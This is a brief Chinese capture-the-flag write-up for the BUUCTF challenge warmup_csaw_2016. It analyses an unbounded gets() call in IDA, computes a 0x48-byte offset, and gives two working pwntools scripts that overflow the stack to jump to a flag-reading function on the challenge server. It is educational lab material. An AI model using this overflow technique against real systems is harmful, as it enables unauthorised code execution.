# BUUCTF-warmup_csaw_2016

## 1.checksec/file



<img src="https://i-blog.csdnimg.cn/blog_migrate/e19150363e53980ff821b04e430079fd.png" alt="" style="max-height:368px; box-sizing:content-box;" />




64位的linux文件

## 2.ida

找到主函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/e14517bec1cf0e075b57d7b49695743a.png" alt="" style="max-height:294px; box-sizing:content-box;" />


发现致命函数 get() 因为get可以无限输入

看看有没有什么函数我们可以返回的

双击进入sub_40060d



<img src="https://i-blog.csdnimg.cn/blog_migrate/e5f7dde73ab9623c781c074cd18bf9e1.png" alt="" style="max-height:135px; box-sizing:content-box;" />


直接发现这个函数是取flag的 所以我们开始看这个函数的地址



<img src="https://i-blog.csdnimg.cn/blog_migrate/5e8449f6c56528682fdb3ce1092df03d.png" alt="" style="max-height:156px; box-sizing:content-box;" />


所以函数地址是 0x40060d

我们看看get什么时候开始的



<img src="https://i-blog.csdnimg.cn/blog_migrate/301864a7cfbfcdf45c0dabe7316b0577.png" alt="" style="max-height:185px; box-sizing:content-box;" />


发现get是40h开始 然后因为64位有8位的rdp 所以需要40h+8

40h=64    --->  64+8

或者0x40+0x08=0x48

## 3.exp

```cobol
from pwn import *
p=remote('node4.buuoj.cn',27652)
payload=b'A'*64+b'B'*8+p64(0x40060d)
p.sendline(payload)
p.interactive()
 
 
 
 
 
from pwn import *
p=remote('node4.buuoj.cn',27652)
payload=b'A'*(0x40+0x08)+p64(0x40060d)
p.sendline(payload)
p.interactive()
 
```

两个一样的



<img src="https://i-blog.csdnimg.cn/blog_migrate/797d0506aa6a3152d046473e2b2947e8.png" alt="" style="max-height:446px; box-sizing:content-box;" />